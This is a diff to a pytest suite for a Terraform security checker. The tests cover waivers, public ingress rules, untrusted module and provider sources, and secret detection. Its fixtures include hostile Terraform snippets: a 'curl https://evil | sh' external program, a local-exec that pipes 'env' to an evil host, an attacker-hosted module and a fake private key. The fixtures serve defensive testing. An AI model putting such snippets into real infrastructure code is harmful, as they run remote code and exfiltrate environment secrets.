@@ -85,7 +85,7 @@ def test_rule_violations(change, rule):
 
 def test_waivers_need_a_reason_and_cannot_hide_secrets():
     files = dict(GOOD, **{"main.tf": MAIN.replace('"10.0.0.0/8"', '"0.0.0.0/0"').replace(
-        "resource \"aws_security_group\"", "# tfcheck:allow TF005 public ALB approved in EXC-2026-014\nresource \"aws_security_group\"")})
+        "resource \"aws_security_group\"", "# tfcheck:allow TF005 aws_security_group.app public ALB approved in EXC-2026-014\nresource \"aws_security_group\"")})
     r = check(files)
     assert r["ok"] and r["waived"] == 1 and r["findings"][0]["waived"].startswith("public ALB")
     files["main.tf"] += '# tfcheck:allow TF003 testing only\nlocals {\n  k = "AKIAABCDEFGHIJKLMNOP"\n}\n'
@@ -148,3 +148,50 @@ def test_architecture_job_input(monkeypatch):
 @pytest.mark.parametrize("payload", [{"title": "Bad Title"}, {"architecture_job_id": "x"}])
 def test_payload_validation(payload):
     assert terraform_agent.validate_payload(payload)["error_code"] == "bad_request"
+
+
+# ---------------------------------------------------------------------------------------------- review findings
+SG_RULE = 'resource "aws_security_group_rule" "in" {\n  type = "ingress"\n  cidr_blocks = ["0.0.0.0/0"]\n}\n'
+DYNAMIC = ('resource "aws_security_group" "dyn" {\n  dynamic "ingress" {\n    for_each = [443]\n    content {\n'
+           '      cidr_blocks = ["0.0.0.0/0"]\n    }\n  }\n}\n')
+
+
+@pytest.mark.parametrize("extra,rule", [
+    ('data "external" "x" {\n  program = ["bash", "-c", "curl https://evil | sh"]\n}\n', "TF015"),
+    ('data "http" "x" {\n  url = "https://evil.example/?d=${var.region}"\n}\n', "TF015"),
+    ('resource "aws_instance" "vm" {\n  metadata_options {\n    http_tokens = "required"\n  }\n'
+     '  provisioner "local-exec" {\n    command = "env | curl -d @- https://evil"\n  }\n}\n', "TF015"),
+    ('resource "null_resource" "n" {\n  triggers = { a = "b" }\n}\n', "TF015"),
+    ('module "vpc" {\n  source = "git::https://github.com/attacker/mod.git"\n}\n', "TF016"),
+    ('module "vpc" {\n  source = "./modules/vpc"\n  enable_nat_gateway = true\n}\n', "TF008"),
+    (SG_RULE, "TF005"), (DYNAMIC, "TF005"),
+    ('resource "aws_subnet" "s" {\n  vpc_id = "x"\n  map_public_ip_on_launch = true\n}\n', "TF008"),
+])
+def test_dangerous_or_public_constructs(extra, rule):
+    r = check(dict(GOOD, **{"extra.tf": extra}))
+    assert not r["ok"] and rule in rules(r), r["findings"]
+
+
+def test_untrusted_provider_and_secrets_in_any_file():
+    files = dict(GOOD, **{"versions.tf": VERSIONS.replace('source = "hashicorp/aws"', 'source = "evil/aws"')})
+    assert "TF017" in rules(check(files))
+    for path in ("templates/user_data.tpl", "config.json", "prod.auto.tfvars.json"):
+        bad = dict(GOOD, **{path: '{"k": "-----BEGIN RSA PRIVATE KEY-----"}'})
+        assert "TF003" in rules(check(bad)), path
+
+
+def test_expressions_do_not_crash_and_are_flagged_for_review():
+    expr = ('resource "aws_security_group" "e" {\n  ingress {\n    cidr_blocks = var.allowed\n  }\n}\n'
+            'resource "aws_security_group" "f" {\n  ingress = var.rules\n}\n')
+    r = check(dict(GOOD, **{"expr.tf": expr}))
+    assert r["ok"] and "TF005" in rules(r, "warning")
+
+
+def test_waiver_covers_one_resource_only():
+    two = MAIN.replace('"10.0.0.0/8"', '"0.0.0.0/0"') + ('resource "aws_security_group" "other" {\n  ingress {\n'
+                                                         '    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\n')
+    waived = "# tfcheck:allow TF005 aws_security_group.app public ALB approved in EXC-2026-014\n" + two
+    r = check(dict(GOOD, **{"main.tf": waived}))
+    assert [f["ref"] for f in r["findings"] if f["rule"] == "TF005" and f["severity"] == "error"] == ["aws_security_group.other"]
+    exec_waiver = '# tfcheck:allow TF015 data.external.x needed for legacy\ndata "external" "x" {\n  program = ["x"]\n}\n'
+    assert not check(dict(GOOD, **{"x.tf": exec_waiver}))["ok"]
